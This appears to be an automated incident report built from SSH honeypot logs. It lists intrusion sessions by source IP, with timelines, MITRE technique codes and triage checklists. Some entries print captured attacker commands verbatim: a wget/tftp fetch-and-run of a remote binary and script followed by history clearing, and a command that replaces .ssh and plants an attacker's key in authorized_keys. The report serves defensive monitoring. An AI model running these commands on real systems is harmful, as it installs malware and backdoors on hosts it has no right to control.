| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:02 |
| **Last Seen** | 2026-07-30 16:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:02:41` | `cowrie.session.connect` |
| `2026-07-30 16:02:42` | `cowrie.client.version` |
| `2026-07-30 16:02:42` | `cowrie.client.kex` |
| `2026-07-30 16:02:44` | `cowrie.login.success` |
| `2026-07-30 16:02:46` | `cowrie.session.params` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.success` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:46` | `cowrie.command.input` |
| `2026-07-30 16:02:47` | `cowrie.log.closed` |
| `2026-07-30 16:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e238a1b3fa72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:04 |
| **Last Seen** | 2026-07-30 16:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:04:38` | `cowrie.session.connect` |
| `2026-07-30 16:04:38` | `cowrie.client.version` |
| `2026-07-30 16:04:38` | `cowrie.client.kex` |
| `2026-07-30 16:04:40` | `cowrie.login.success` |
| `2026-07-30 16:04:42` | `cowrie.session.params` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.success` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.command.input` |
| `2026-07-30 16:04:42` | `cowrie.log.closed` |
| `2026-07-30 16:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97bbac4087b7

| Field | Detail |
|---|---|
| **Source IP** | `116.53.130[.]4` |
| **First Seen** | 2026-07-30 16:06 |
| **Last Seen** | 2026-07-30 16:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:06:16` | `cowrie.session.connect` |
| `2026-07-30 16:06:18` | `cowrie.client.version` |
| `2026-07-30 16:06:18` | `cowrie.client.kex` |
| `2026-07-30 16:06:22` | `cowrie.login.success` |
| `2026-07-30 16:06:23` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:06:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.53.130[.]4` to AbuseIPDB if not already reported
- [ ] Block `116.53.130[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03cc283ec54c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:06 |
| **Last Seen** | 2026-07-30 16:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:06:33` | `cowrie.session.connect` |
| `2026-07-30 16:06:34` | `cowrie.client.version` |
| `2026-07-30 16:06:34` | `cowrie.client.kex` |
| `2026-07-30 16:06:36` | `cowrie.login.success` |
| `2026-07-30 16:06:37` | `cowrie.session.params` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.success` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:37` | `cowrie.command.input` |
| `2026-07-30 16:06:38` | `cowrie.log.closed` |
| `2026-07-30 16:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7255c2e7300

| Field | Detail |
|---|---|
| **Source IP** | `179.184.218[.]49` |
| **First Seen** | 2026-07-30 16:06 |
| **Last Seen** | 2026-07-30 16:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:06:34` | `cowrie.session.connect` |
| `2026-07-30 16:06:34` | `cowrie.client.version` |
| `2026-07-30 16:06:34` | `cowrie.client.kex` |
| `2026-07-30 16:06:36` | `cowrie.login.success` |
| `2026-07-30 16:06:37` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.218[.]49` to AbuseIPDB if not already reported
- [ ] Block `179.184.218[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-426d7b7fab6a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 16:09 |
| **Last Seen** | 2026-07-30 16:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:09:32` | `cowrie.session.connect` |
| `2026-07-30 16:09:32` | `cowrie.client.version` |
| `2026-07-30 16:09:32` | `cowrie.client.kex` |
| `2026-07-30 16:09:32` | `cowrie.login.success` |
| `2026-07-30 16:09:32` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:09:33` | `cowrie.direct-tcpip.data` |
| `2026-07-30 16:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2368f5c154b8

| Field | Detail |
|---|---|
| **Source IP** | `185.40.122[.]250` |
| **First Seen** | 2026-07-30 16:09 |
| **Last Seen** | 2026-07-30 16:09 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:09:43` | `cowrie.session.connect` |
| `2026-07-30 16:09:44` | `cowrie.client.version` |
| `2026-07-30 16:09:44` | `cowrie.client.kex` |
| `2026-07-30 16:09:48` | `cowrie.login.success` |
| `2026-07-30 16:09:49` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.40.122[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.40.122[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4702d6d2abb2

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-07-30 16:09 |
| **Last Seen** | 2026-07-30 16:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:09:55` | `cowrie.session.connect` |
| `2026-07-30 16:09:56` | `cowrie.client.version` |
| `2026-07-30 16:09:56` | `cowrie.client.kex` |
| `2026-07-30 16:09:58` | `cowrie.login.success` |
| `2026-07-30 16:09:59` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26ff1a890dad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:10 |
| **Last Seen** | 2026-07-30 16:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:10:19` | `cowrie.session.connect` |
| `2026-07-30 16:10:20` | `cowrie.client.version` |
| `2026-07-30 16:10:20` | `cowrie.client.kex` |
| `2026-07-30 16:10:22` | `cowrie.login.success` |
| `2026-07-30 16:10:23` | `cowrie.session.params` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.success` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:23` | `cowrie.command.input` |
| `2026-07-30 16:10:24` | `cowrie.log.closed` |
| `2026-07-30 16:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb36264b3af

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]140` |
| **First Seen** | 2026-07-30 16:10 |
| **Last Seen** | 2026-07-30 16:10 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://83.168.69[.]141/armv7l; chmod +x; ./armv7l; tftp -g 83.168.69[.]141 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c` |
| **Download Attempts** | hxxp://83.168.69[.]141/armv7l |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:10:37` | `cowrie.session.connect` |
| `2026-07-30 16:10:37` | `cowrie.login.success` |
| `2026-07-30 16:10:38` | `cowrie.session.params` |
| `2026-07-30 16:10:39` | `cowrie.command.input` |
| `2026-07-30 16:10:39` | `cowrie.command.input` |
| `2026-07-30 16:10:40` | `cowrie.session.file_download` |
| `2026-07-30 16:10:54` | `cowrie.log.closed` |
| `2026-07-30 16:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]140` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3b4520811a

| Field | Detail |
|---|---|
| **Source IP** | `43.157.248[.]241` |
| **First Seen** | 2026-07-30 16:10 |
| **Last Seen** | 2026-07-30 16:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:10:46` | `cowrie.session.connect` |
| `2026-07-30 16:10:46` | `cowrie.client.version` |
| `2026-07-30 16:10:46` | `cowrie.client.kex` |
| `2026-07-30 16:10:48` | `cowrie.login.success` |
| `2026-07-30 16:10:49` | `cowrie.session.params` |
| `2026-07-30 16:10:49` | `cowrie.command.input` |
| `2026-07-30 16:10:49` | `cowrie.command.failed` |
| `2026-07-30 16:10:49` | `cowrie.log.closed` |
| `2026-07-30 16:10:50` | `cowrie.session.params` |
| `2026-07-30 16:10:50` | `cowrie.command.input` |
| `2026-07-30 16:10:50` | `cowrie.session.file_download` |
| `2026-07-30 16:10:50` | `cowrie.log.closed` |
| `2026-07-30 16:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.248[.]241` to AbuseIPDB if not already reported
- [ ] Block `43.157.248[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea33448e82b

| Field | Detail |
|---|---|
| **Source IP** | `43.157.248[.]241` |
| **First Seen** | 2026-07-30 16:10 |
| **Last Seen** | 2026-07-30 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:10:51` | `cowrie.session.connect` |
| `2026-07-30 16:10:51` | `cowrie.client.version` |
| `2026-07-30 16:10:51` | `cowrie.client.kex` |
| `2026-07-30 16:10:52` | `cowrie.login.success` |
| `2026-07-30 16:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.248[.]241` to AbuseIPDB if not already reported
- [ ] Block `43.157.248[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-698084c3ad3d

| Field | Detail |
|---|---|
| **Source IP** | `43.157.248[.]241` |
| **First Seen** | 2026-07-30 16:10 |
| **Last Seen** | 2026-07-30 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:10:52` | `cowrie.session.connect` |
| `2026-07-30 16:10:52` | `cowrie.client.version` |
| `2026-07-30 16:10:53` | `cowrie.client.kex` |
| `2026-07-30 16:10:54` | `cowrie.login.success` |
| `2026-07-30 16:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.248[.]241` to AbuseIPDB if not already reported
- [ ] Block `43.157.248[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a1dc6c5716

| Field | Detail |
|---|---|
| **Source IP** | `42.51.41[.]137` |
| **First Seen** | 2026-07-30 16:11 |
| **Last Seen** | 2026-07-30 16:16 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:11:18` | `cowrie.session.connect` |
| `2026-07-30 16:11:18` | `cowrie.client.version` |
| `2026-07-30 16:11:19` | `cowrie.client.kex` |
| `2026-07-30 16:11:20` | `cowrie.login.success` |
| `2026-07-30 16:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.41[.]137` to AbuseIPDB if not already reported
- [ ] Block `42.51.41[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f33ef864db00

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-30 16:12 |
| **Last Seen** | 2026-07-30 16:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:12:09` | `cowrie.session.connect` |
| `2026-07-30 16:12:09` | `cowrie.client.version` |
| `2026-07-30 16:12:09` | `cowrie.client.kex` |
| `2026-07-30 16:12:10` | `cowrie.login.success` |
| `2026-07-30 16:12:11` | `cowrie.session.params` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.success` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:11` | `cowrie.command.input` |
| `2026-07-30 16:12:12` | `cowrie.log.closed` |
| `2026-07-30 16:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-493b49cc3f90

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-07-30 16:12 |
| **Last Seen** | 2026-07-30 16:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:12:10` | `cowrie.session.connect` |
| `2026-07-30 16:12:10` | `cowrie.client.version` |
| `2026-07-30 16:12:10` | `cowrie.client.kex` |
| `2026-07-30 16:12:12` | `cowrie.login.success` |
| `2026-07-30 16:12:12` | `cowrie.direct-tcpip.request` |
| `2026-07-30 16:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4dc978aa77c

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-30 16:12 |
| **Last Seen** | 2026-07-30 16:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:12:31` | `cowrie.session.connect` |
| `2026-07-30 16:12:31` | `cowrie.client.version` |
| `2026-07-30 16:12:31` | `cowrie.client.kex` |
| `2026-07-30 16:12:32` | `cowrie.login.success` |
| `2026-07-30 16:12:33` | `cowrie.session.params` |
| `2026-07-30 16:12:33` | `cowrie.command.input` |
| `2026-07-30 16:12:33` | `cowrie.command.failed` |
| `2026-07-30 16:12:33` | `cowrie.log.closed` |
| `2026-07-30 16:12:33` | `cowrie.session.params` |
| `2026-07-30 16:12:33` | `cowrie.command.input` |
| `2026-07-30 16:12:33` | `cowrie.session.file_download` |
| `2026-07-30 16:12:33` | `cowrie.log.closed` |
| `2026-07-30 16:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5183b9a9559e

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-30 16:12 |
| **Last Seen** | 2026-07-30 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:12:34` | `cowrie.session.connect` |
| `2026-07-30 16:12:34` | `cowrie.client.version` |
| `2026-07-30 16:12:34` | `cowrie.client.kex` |
| `2026-07-30 16:12:34` | `cowrie.login.success` |
| `2026-07-30 16:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0e72964eaf

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-30 16:12 |
